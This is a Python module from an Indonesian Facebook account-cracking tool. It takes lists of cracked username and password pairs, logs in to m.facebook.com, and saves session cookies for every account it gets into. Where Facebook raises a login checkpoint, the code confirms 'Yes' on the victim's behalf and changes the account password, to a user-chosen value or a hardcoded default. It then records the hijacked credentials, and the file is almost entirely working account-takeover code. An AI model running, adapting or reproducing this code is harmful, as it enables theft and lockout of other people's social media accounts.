#######################################################
# Name           : Brute Facebook (BF)                #
# File           : dump.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 3.11                               #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, os, re, time, random

from bs4 import BeautifulSoup as par
from .apk import Cek_Apk
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
console = Console()

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

###########################################
class Cek_has:

    def __init__(self):
        self.pwa, self.pwx = [], []
        self.hsl_cp, self.apk = [], []
        self.url = "https://m.facebook.com"

    def password(self):
        pwBar=input(f"[{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:print(f"[{M}×{N}] kata sandi minimal 6 karakter");self.password()
        else:self.pwa.append(pwBar)

    def cek_apk(self):
        prints(Panel("[[bold cyan]?[/]] tampilkan aplikasi terkait ([bold yellow]tidak di sarankan[/]) ([bold green]y[/]/[bold red]t[/])", padding=(0,2), style="bold white", width=70, title="[bold red]•[bold yellow]•[bold green]• APLIKASI •[bold yellow]•[bold red]•[/]"))
        crot = input(f"[{M}?{N}] pilih: ")
        if crot in[""]:prints(Panel("[[bold red![/]] jangan kosong", style="bold white", width=70));self.cek_apk()
        elif crot in["Y","y"]:self.apk.append("y")
        elif crot in["T","t"]:self.apk.append("t")
        else:prints(Panel("[[bold red![/]] y/t bro", style="bold white", width=70));self.cek_apk()

    def hasil(self, ok, cp):
        if len(ok) != 0 or len(cp) != 0:
            print("");prints(Panel(f"       [[bold green]+[/]] Hasil OK : [bold green]{len(ok)}[/]        [[bold red]-[/]] Hasil CP : [bold yellow]{len(cp)}[/]", title="[bold green]PROSES[/] [bold yellow]SELESAI[/]", style="bold white", width=70))
            cek_cp = input(f"[{O}?{N}] munculkan opsi checkpoint detedtor [Y/t]: ")
            if cek_cp in["Y","y"]:
                prints(Panel("               🤗 Hidupkan mode pesawat 5 detik.", style="bold white", width=70));time.sleep(5)
                ww=input(f"[{O}?{N}] ubah password ketika tap yes [Y/t]: ")
                if ww in["Y","y"]:
                    self.pwx.append("y")
                    prints(Panel("[[bold cyan]![/]] [italic]Jika ingin mengubah kata sandi Ketika tab yes, gunakanlah password minimal 6 huruf. contoh: [bold green]yayanxd[/]", style="bold white", width=70))
                    self.password()
                self.cek_apk()
                prints(Panel("       [[bold green]+[/]][green] proses checkpoint detedtor sedang di mulai[/] [[bold green]+[/]]", style="bold white", width=70))
                for memek in cp:
                    kontol = memek.replace("\n", "")
                    titid  = kontol.split("|")
                    try:lahir=titid[2]
                    except:lahir="kosong"
                    try:
                        self.log_hasil(titid[0].replace(" [×] ", ""), titid[1], lahir)
                    except requests.ConnectionError:prints(Panel("[italic bold red]                 Hidupkan mode pesawat 3 detik", style="bold white", width=70));time.sleep(6);continue
                    except AttributeError:prints(Panel("[italic bold red]Gagal membuka web facebook, hidupkan mode pesawat 3 detik.", style="bold white", width=70));time.sleep(6)
                prints(Panel("       [[bold green]✓[/]] proses checkpoint detedtor akun selesai...", style="bold white", width=70))
                input(f"[ {O}TEKAN ENTER {N}] ");os.system("python run.py")
            elif cek_cp in["T","t"]:print();prints(Panel('Selamat tinggal. Semoga hari" anda menyenangkan:)', style="bold white", width=70));exit()
            else:print();prints(Panel('Selamat tinggal. Semoga hari" anda menyenangkan:)', style="bold white", width=70));exit()
        else:exit(f"\n[{M}!{N}] opshh kamu tidak mendapatkan hasil :(")

    def gabut(self):
        try:
            xxx = os.listdir("results/CP")
            for z in xxx:
                self.hsl_cp.append(z)
        except:pass
        if len(self.hsl_cp)==0:
            prints(Panel("Tidak ada file di dalam folder [italic bold red]results/CP[/] silahkan crack terlebih dahulu", style="bold white", width=70));exit()
        else:
            xa, xx = {}, 0
            prints(Panel("             HASIL [bold yellow]CP [/]YANG TERSIMPAN DI FOLDER ANDA", style="bold white", width=70))
            table = Table(title="")
            table.add_column("NO.", width=4, style="bold cyan")
            table.add_column("      HASIL CP",width=25, style="bold white")
            table.add_column("TOTAL AKUN",width=5, style="bold green")
            for tod in self.hsl_cp:
                try:fi2 = open(f"results/CP/{tod}").readlines()
                except:continue
                xx+=1
                if xx<100:
                    nom = ""+str(xx)
                    xa.update({str(xx):str(tod)})
                    xa.update({nom+"0":str(xx)})
                    table.add_row(f"{nom}", f"{tod}", f"{str(len(fi2))}")
                else:
                    xa.update({str(xx):str(tod)})
                    table.add_row(f"{nom}", f"{tod}", f"{str(len(fi2))}")
        console.print(table, justify="center", width=70)
        prints(Panel("    [[bold red]![/]]  [italic bold red]SILAHKAN PILIH NOMOR YANG MAU ANDA CEK[/]  [[bold red]![/]]", padding=(0,5), style="bold white", width=70))
        file = input(f"[{M}?{N}] nomor : ")
        try:ajg = xa[file]
        except KeyError:
            prints(Panel(f"         😡 file [italic bold red]{file}[/] tidak ada cek nomor nya pler", style="bold white", width=70));exit()
        try:
            buka_baju = open(f"results/CP/{ajg}").readlines()
        except FileNotFoundError:
            prints(Panel("Tidak ada file di dalam folder [italic bold red]results/CP[/] silahkan crack terlebih dahulu", style="bold white", width=70));exit()
        prints(Panel("               🤗 Hidupkan mode pesawat 5 detik.", style="bold white", width=70));time.sleep(5)
        wwx=input(f"[{M}?{N}] ubah password ketika tap yes [Y/t]: ")
        if wwx in ["Y","y"]:
            self.pwx.append("y")
            prints(Panel("[[bold cyan]![/]][italic] Jika ingin mengubah kata sandi Ketika tab yes, gunakanlah password minimal 6 huruf. contoh: [bold green]yayanxd[/]", style="bold white", width=70))
            self.password()
        self.cek_apk()
        prints(Panel(f"[[bold green]+[/]] Total akun : [bold cyan]{str(len(buka_baju))}[/]", style="bold white", width=70))
        for memek in buka_baju:
            kontol = memek.replace("\n", "")
            titid  = kontol.split("|")
            try:lahir=titid[2]
            except:lahir="kosong"
            try:
                self.log_hasil(titid[0].replace(" [×] ", ""), titid[1], lahir)
            #except Exception as e:exit(e)
            except requests.ConnectionError:prints(Panel("[italic bold red]                 Hidupkan mode pesawat 3 detik", style="bold white", width=70));time.sleep(6);continue
            except AttributeError:prints(Panel("[italic bold red]Gagal membuka web facebook, hidupkan mode pesawat 3 detik.", style="bold white", width=70));time.sleep(6)
        prints(Panel(f"              [[bold green]✓[/]] proses pengecekan akun selesai..", style="bold white", width=70))
        input(f"[ {O}TEKAN ENTER {N}] ");os.system("python run.py")

    def log_hasil(self, user, pasw, lahir):
        tree = Tree(""); data, data2 = {}, {}
        session=requests.Session()
        #session.headers.update({"authority":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":"https://m.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
        soup=par(session.get(f"{self.url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text, "html.parser")
        link=soup.find("form",{"method":"post"})
        for x in soup("input"):
            data.update({x.get("name"):x.get("value")})
        data.update({"email":user,"pass":pasw})
        urlPost=session.post(self.url+link.get("action"), data=data)
        response=par(urlPost.text, "html.parser")
        if "c_user" in session.cookies.get_dict():
            if "Akun Anda Dikunci" in urlPost.text:
                tree.add(f"[bold yellow]{user}|{pasw}[/]")
                tree.add("😭[italic bold red] akun ini terpasang autentikasi dua faktor")
                prints(tree)
            else:
                coki = self.ngoxok(session.cookies.get_dict())
                wrt = " [✓] "+user+"|"+pasw+"|"+coki
                with open(f"results/OK/OKE.txt", "a", encoding="utf-8") as r:
                    r.write(wrt+"\n")
                tree.add(f"[bold green]{user}|{pasw}[/]").add(f"[bold green] {coki}")
                tree.add("😎🎉[italic bold green] Hore akun ini tidak checkpoint")
                prints(tree)
        elif "checkpoint" in session.cookies.get_dict():
            title=re.findall("\<title>(.*?)<\/title>",str(response))
            link2=response.find("form",{"method":"post"})
            listInput=["fb_dtsg","jazoest","checkpoint_data","submit[Continue]","nh"]
            for x in response("input"):
                if x.get("name") in listInput:
                    data2.update({x.get("name"):x.get("value")})
            an=session.post(self.url+link2.get("action"), data=data2)
            response2=par(an.text,"html.parser")
            cek=[cek.text for cek in response2.find_all("option")]
            if(len(cek)==0):
                if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                    if "y" in self.pwx:self.ubah_pw(session, response, link2, user, self.pwa)
                    else:self.ubah_pw(session, response, link2, user, "YayanGanteng:v")
                elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                    tree.add(f"[bold yellow]{user}|{pasw}[/]")
                    tree.add("😭[italic bold red] akun ini terpasang autentikasi dua faktor")
                    prints(tree)
                else:
                    tree.add(f"[bold yellow]{user}|{pasw}[/]")
                    tree.add("🤔[italic bold red] gagal login kemungkinan password sudah di ganti.")
                    prints(tree)
            else:
                if "kosong" in lahir:
                    cp = Tree("")
                    tree.add(f"[bold blue]usermame[/] : [bold yellow]{user}[/]")
                    tree.add(f"[bold blue]password[/] : [bold yellow]{pasw}[/]")
                    for opt in range(len(cek)):
                        cp.add(f"[bold green]{str(opt+1)}[/].[italic bold white] {cek[opt]}")
                    tree.add(f"ada [italic bold green]{(len(cek))}[/] opsi").add(cp)
                    prints(tree)
                else:
                    cp = Tree("")
                    tree.add(f"[bold blue]usermame[/] : [bold yellow]{user}[/]")
                    tree.add(f"[bold blue]password[/] : [bold yellow]{pasw}[/]")
                    tree.add(f"[bold cyan]birthday[/] : [bold red]{lahir}[/]")
                    for opt in range(len(cek)):
                        cp.add(f"[bold green]{str(opt+1)}[/].[italic bold white] {cek[opt]}")
                    tree.add(f"ada [italic bold green]{(len(cek))}[/] opsi").add(cp)
                    prints(tree)
        else:
            tree.add(f"[bold yellow]{user}|{pasw}[/]")
            tree.add("😔[italic bold red] Kata sandi salah atau sudah diubah")
            prints(tree)

    def kentod(self, integer):
        lis = list("1234567890")
        gets = [random.choice(lis) for _ in range(integer)]
        return "".join(gets).upper()

    def ngoxok(self, cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
        return(str(coki))

    def ubah_pw(self, session, response, link2, user, pwx):
        tree = Tree(""); dat, dat2 = {}, {}
        but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
        for x in response("input"):
            if x.get("name") in but:
                dat.update({x.get("name"):x.get("value")})
        ubahPw=session.post(self.url+link2.get("action"), data=dat).text
        resUbah=par(ubahPw,"html.parser")
        link3=resUbah.find("form",{"method":"post"})
        but2=["submit[Next]","nh","fb_dtsg","jazoest"]
        if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
            for b in resUbah("input"):
                if b.get("name") in but2:
                    dat2.update({b.get("name"):b.get("value")})
            dat2.update({"password_new":"".join(pwx)})
            session.post(self.url+link3.get("action"), data=dat2)
            digi = random.choice([2])
            digi = self.kentod(digi)
            coki = self.ngoxok(session.cookies.get_dict())
            wrt = " [✓] "+user+"|"+"".join(pwx)+"|"+coki
            with open(f"results/OK/TAB-YES.txt", "a", encoding="utf-8") as r:
                r.write(wrt+"\n")
            if "y" in self.apk:
                tree.add(f"[bold green]{user}|{''.join(pwx)}[/]").add(f"[bold green] {coki}")
                tree.add(f"😎🎉[italic bold green] akun ini berhasil di ubah password menjadi:[blue] {''.join(pwx)}")
                prints(tree);Cek_Apk(user, "".join(pwx), coki, digi)
            else:
                tree.add(f"[bold green]{user}|{''.join(pwx)}[/]").add(f"[bold green] {coki}")
                tree.add(f"😎🎉[italic bold green] akun ini berhasil di ubah password menjadi:[blue] {''.join(pwx)}")
                prints(tree)
